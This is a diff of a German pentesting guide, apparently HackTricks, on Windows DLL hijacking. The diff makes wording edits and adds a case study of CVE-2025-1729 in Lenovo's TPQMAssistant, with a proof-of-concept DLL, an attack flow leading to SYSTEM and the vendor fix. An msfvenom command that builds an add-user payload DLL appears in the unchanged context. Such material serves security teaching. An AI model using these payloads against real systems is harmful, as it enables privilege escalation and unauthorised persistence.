@@ -5,22 +5,22 @@
 
 ## Grundinformationen
 
-DLL Hijacking beinhaltet die Manipulation einer vertrauenswürdigen Anwendung, um eine bösartige DLL zu laden. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Es wird hauptsächlich für die Codeausführung, das Erreichen von Persistenz und seltener für die Eskalation von Rechten verwendet. Trotz des Fokus auf Eskalation bleibt die Methode des Hijackings über die Ziele hinweg konsistent.
+DLL Hijacking beinhaltet die Manipulation einer vertrauenswürdigen Anwendung, um eine bösartige DLL zu laden. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Es wird hauptsächlich für die Codeausführung, das Erreichen von Persistenz und, seltener, für die Eskalation von Rechten verwendet. Trotz des Fokus auf Eskalation bleibt die Methode des Hijackings über die Ziele hinweg konsistent.
 
 ### Häufige Techniken
 
 Es werden mehrere Methoden für DLL Hijacking eingesetzt, wobei jede je nach DLL-Lade-Strategie der Anwendung unterschiedlich effektiv ist:
 
-1. **DLL-Ersetzung**: Ersetzen einer echten DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der ursprünglichen DLL zu erhalten.
-2. **DLL-Suchreihenfolge-Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen, um das Suchmuster der Anwendung auszunutzen.
-3. **Phantom-DLL-Hijacking**: Erstellen einer bösartigen DLL, die von einer Anwendung geladen wird, in der Annahme, es handele sich um eine nicht vorhandene erforderliche DLL.
-4. **DLL-Umleitung**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest` / `.exe.local`-Dateien, um die Anwendung auf die bösartige DLL zu lenken.
+1. **DLL-Ersetzung**: Austausch einer echten DLL gegen eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der ursprünglichen DLL zu erhalten.
+2. **DLL-Suchreihenfolge-Hijacking**: Platzierung der bösartigen DLL in einem Suchpfad vor der legitimen, um das Suchmuster der Anwendung auszunutzen.
+3. **Phantom-DLL-Hijacking**: Erstellen einer bösartigen DLL, die von einer Anwendung geladen wird, die denkt, es sei eine nicht vorhandene erforderliche DLL.
+4. **DLL-Umleitung**: Modifizieren von Suchparametern wie `%PATH%` oder `.exe.manifest` / `.exe.local`-Dateien, um die Anwendung auf die bösartige DLL zu lenken.
 5. **WinSxS DLL-Ersetzung**: Ersetzen der legitimen DLL durch eine bösartige im WinSxS-Verzeichnis, eine Methode, die oft mit DLL Side-Loading in Verbindung gebracht wird.
-6. **Relative Pfad DLL Hijacking**: Platzieren der bösartigen DLL in einem benutzerkontrollierten Verzeichnis mit der kopierten Anwendung, ähnlich den Techniken der Binary Proxy Execution.
+6. **Relative Pfad DLL Hijacking**: Platzierung der bösartigen DLL in einem benutzerkontrollierten Verzeichnis mit der kopierten Anwendung, ähnlich den Techniken der Binary Proxy Execution.
 
 ## Fehlende DLLs finden
 
-Der häufigste Weg, um fehlende DLLs in einem System zu finden, besteht darin, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen und die **folgenden 2 Filter** einzustellen:
+Der häufigste Weg, um fehlende DLLs in einem System zu finden, besteht darin, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen und **die folgenden 2 Filter** einzustellen:
 
 ![](<../../../images/image (961).png>)
 
@@ -31,17 +31,17 @@ und nur die **Dateisystemaktivität** anzuzeigen:
 ![](<../../../images/image (153).png>)
 
 Wenn Sie nach **fehlenden DLLs im Allgemeinen** suchen, lassen Sie dies einige **Sekunden** laufen.\
-Wenn Sie nach einer **fehlenden DLL in einer bestimmten ausführbaren Datei** suchen, sollten Sie **einen anderen Filter wie "Prozessname" "enthält" "\<exec name>" setzen, es ausführen und die Ereignisaufnahme stoppen**.
+Wenn Sie nach einer **fehlenden DLL in einer bestimmten ausführbaren Datei** suchen, sollten Sie **einen anderen Filter wie "Prozessname" "enthält" "\<exec name>" setzen, es ausführen und die Ereignisaufzeichnung stoppen**.
 
 ## Ausnutzen fehlender DLLs
 
-Um Privilegien zu eskalieren, haben wir die beste Chance, wenn wir in der Lage sind, **eine DLL zu schreiben, die ein privilegierter Prozess versuchen wird zu laden** an einem **Ort, wo sie gesucht wird**. Daher werden wir in der Lage sein, **eine DLL in einem** **Ordner** zu **schreiben**, wo die **DLL zuerst gesucht wird**, bevor der Ordner, in dem die **ursprüngliche DLL** ist (seltsamer Fall), oder wir werden in der Lage sein, **in einen Ordner zu schreiben, wo die DLL gesucht wird** und die ursprüngliche **DLL nicht in einem Ordner existiert**.
+Um Privilegien zu eskalieren, haben wir die beste Chance, wenn wir in der Lage sind, **eine DLL zu schreiben, die ein privilegierter Prozess versuchen wird zu laden** an einem **Ort, wo sie gesucht wird**. Daher werden wir in der Lage sein, **eine DLL in einem** **Ordner** zu **schreiben**, wo die **DLL vor** dem Ordner, in dem die **ursprüngliche DLL** ist (seltsamer Fall), gesucht wird, oder wir werden in der Lage sein, **in einem Ordner zu schreiben, wo die DLL gesucht wird** und die ursprüngliche **DLL nicht in einem Ordner existiert**.
 
 ### DLL-Suchreihenfolge
 
 **In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **finden Sie, wie die DLLs spezifisch geladen werden.**
 
-**Windows-Anwendungen** suchen nach DLLs, indem sie einer Reihe von **vordefinierten Suchpfaden** folgen, die einer bestimmten Reihenfolge entsprechen. Das Problem des DLL Hijacking tritt auf, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, um sicherzustellen, dass sie vor der authentischen DLL geladen wird. Eine Lösung zur Vermeidung dessen ist, sicherzustellen, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.
+**Windows-Anwendungen** suchen nach DLLs, indem sie einer Reihe von **vordefinierten Suchpfaden** folgen, die einer bestimmten Reihenfolge entsprechen. Das Problem des DLL Hijackings tritt auf, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, um sicherzustellen, dass sie vor der authentischen DLL geladen wird. Eine Lösung zur Vermeidung dessen ist, sicherzustellen, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.
 
 Sie können die **DLL-Suchreihenfolge auf 32-Bit**-Systemen unten sehen:
 
@@ -50,13 +50,13 @@ Sie können die **DLL-Suchreihenfolge auf 32-Bit**-Systemen unten sehen:
 3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses erhält, aber es wird durchsucht. (_C:\Windows\System_)
 4. Das Windows-Verzeichnis. Verwenden Sie die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten. (_C:\Windows_)
 5. Das aktuelle Verzeichnis.
-6. Die Verzeichnisse, die in der PATH-Umgebungsvariablen aufgeführt sind. Beachten Sie, dass dies nicht den pro-Anwendungspfad umfasst, der durch den **App Paths**-Registrierungsschlüssel angegeben ist. Der **App Paths**-Schlüssel wird nicht verwendet, wenn der DLL-Suchpfad berechnet wird.
+6. Die Verzeichnisse, die in der PATH-Umgebungsvariable aufgeführt sind. Beachten Sie, dass dies nicht den pro-Anwendungspfad umfasst, der durch den **App Paths**-Registrierungsschlüssel angegeben ist. Der **App Paths**-Schlüssel wird nicht verwendet, wenn der DLL-Suchpfad berechnet wird.
 
 Das ist die **Standard**-Suchreihenfolge mit **SafeDllSearchMode** aktiviert. Wenn es deaktiviert ist, steigt das aktuelle Verzeichnis auf den zweiten Platz. Um diese Funktion zu deaktivieren, erstellen Sie den **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**-Registrierungswert und setzen Sie ihn auf 0 (Standard ist aktiviert).
 
 Wenn die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) Funktion mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.
 
-Beachten Sie schließlich, dass **eine DLL geladen werden könnte, indem der absolute Pfad angegeben wird, anstatt nur den Namen**. In diesem Fall wird diese DLL **nur in diesem Pfad gesucht** (wenn die DLL Abhängigkeiten hat, werden diese nur nach Namen gesucht, wie sie geladen wurden).
+Beachten Sie schließlich, dass **eine DLL geladen werden könnte, indem der absolute Pfad angegeben wird, anstatt nur den Namen**. In diesem Fall wird diese DLL **nur in diesem Pfad gesucht** (wenn die DLL Abhängigkeiten hat, werden diese wie gerade nach Namen geladen gesucht).
 
 Es gibt andere Möglichkeiten, die Suchreihenfolge zu ändern, aber ich werde sie hier nicht erklären.
 
@@ -72,10 +72,10 @@ Bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge sind in der Wi
 
 **Anforderungen**:
 
-- Identifizieren Sie einen Prozess, der unter **verschiedenen Privilegien** (horizontale oder laterale Bewegung) arbeitet oder arbeiten wird und **eine DLL** **fehlt**.
+- Identifizieren Sie einen Prozess, der unter **unterschiedlichen Rechten** (horizontale oder laterale Bewegung) arbeitet oder arbeiten wird, der **eine DLL** **fehlt**.
 - Stellen Sie sicher, dass **Schreibzugriff** für ein **Verzeichnis** verfügbar ist, in dem die **DLL** **gesucht wird**. Dieser Ort könnte das Verzeichnis der ausführbaren Datei oder ein Verzeichnis innerhalb des Systempfads sein.
 
-Ja, die Anforderungen sind kompliziert zu finden, da **es standardmäßig seltsam ist, eine privilegierte ausführbare Datei ohne eine DLL zu finden** und es ist sogar **noch seltsamer, Schreibberechtigungen für einen Systempfad-Ordner zu haben** (standardmäßig können Sie das nicht). Aber in falsch konfigurierten Umgebungen ist dies möglich.\
+Ja, die Anforderungen sind kompliziert zu finden, da **es standardmäßig seltsam ist, eine privilegierte ausführbare Datei ohne eine DLL zu finden** und es ist sogar **noch seltsamer, Schreibberechtigungen in einem Systempfad-Ordner zu haben** (standardmäßig können Sie das nicht). Aber in falsch konfigurierten Umgebungen ist dies möglich.\
 Falls Sie Glück haben und die Anforderungen erfüllen, könnten Sie das [UACME](https://github.com/hfiref0x/UACME) Projekt überprüfen. Auch wenn das **Hauptziel des Projekts darin besteht, UAC zu umgehen**, finden Sie dort möglicherweise einen **PoC** für ein DLL-Hijacking für die Windows-Version, die Sie verwenden können (wahrscheinlich müssen Sie nur den Pfad des Ordners ändern, in dem Sie Schreibberechtigungen haben).
 
 Beachten Sie, dass Sie **Ihre Berechtigungen in einem Ordner überprüfen können**, indem Sie:
@@ -92,7 +92,7 @@ Sie können auch die Importe einer ausführbaren Datei und die Exporte einer DLL
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-Für eine vollständige Anleitung, wie man **Dll Hijacking missbraucht, um Privilegien zu eskalieren** mit Berechtigungen zum Schreiben in einen **System Path-Ordner**, siehe:
+Für eine vollständige Anleitung, wie man **Dll Hijacking ausnutzt, um Privilegien zu eskalieren** mit Berechtigungen zum Schreiben in einen **System Path-Ordner**, siehe:
 
 {{#ref}}
 writable-sys-path-+dll-hijacking-privesc.md
@@ -132,7 +132,7 @@ msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
 ### Dein eigenes
 
-Beachte, dass die Dll, die du kompilierst, in mehreren Fällen **mehrere Funktionen exportieren muss**, die vom Opferprozess geladen werden, wenn diese Funktionen nicht existieren, **kann die Binary sie nicht laden** und der **Exploit wird fehlschlagen**.
+Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **mehrere Funktionen exportieren muss**, die vom Opferprozess geladen werden, wenn diese Funktionen nicht existieren, **kann die Binary sie nicht laden** und der **Exploit wird fehlschlagen**.
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -213,10 +213,48 @@ break;
 return TRUE;
 }
 ```
+## Fallstudie: CVE-2025-1729 - Privilegieneskalation mit TPQMAssistant.exe
+
+Dieser Fall demonstriert **Phantom DLL Hijacking** im TrackPoint Quick Menu von Lenovo (`TPQMAssistant.exe`), verfolgt als **CVE-2025-1729**.
+
+### Schwachstellendetails
+
+- **Komponente**: `TPQMAssistant.exe` befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
+- **Geplanter Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` wird täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers ausgeführt.
+- **Verzeichnisberechtigungen**: Schreibbar durch `CREATOR OWNER`, was lokalen Benutzern erlaubt, beliebige Dateien abzulegen.
+- **DLL-Suchverhalten**: Versucht, `hostfxr.dll` zuerst aus seinem Arbeitsverzeichnis zu laden und protokolliert "NAME NOT FOUND", wenn sie fehlt, was auf eine Priorität der lokalen Verzeichnissuche hinweist.
+
+### Exploit-Implementierung
+
+Ein Angreifer kann einen bösartigen `hostfxr.dll` Stub im selben Verzeichnis platzieren, um die fehlende DLL auszunutzen und die Codeausführung im Kontext des Benutzers zu erreichen:
+```c
+#include <windows.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
+if (fdwReason == DLL_PROCESS_ATTACH) {
+// Payload: display a message box (proof-of-concept)
+MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
+}
+return TRUE;
+}
+```
+### Angriffsfluss
+
+1. Als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
+2. Warten, bis die geplante Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
+3. Wenn ein Administrator angemeldet ist, während die Aufgabe ausgeführt wird, läuft die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität.
+4. Ketten Sie Standard-UAC-Bypass-Techniken, um von mittlerer Integrität auf SYSTEM-Rechte zu erhöhen.
+
+### Minderung
+
+Lenovo hat die UWP-Version **1.12.54.0** über den Microsoft Store veröffentlicht, die TPQMAssistant unter `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\` installiert, die anfällige geplante Aufgabe entfernt und die veralteten Win32-Komponenten deinstalliert.
+
 ## Referenzen
+
+- [CVE-2025-1729 - Privilegieneskalation mit TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
+- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
 
 - [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 - [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
-
 
 {{#include ../../../banners/hacktricks-training.md}}
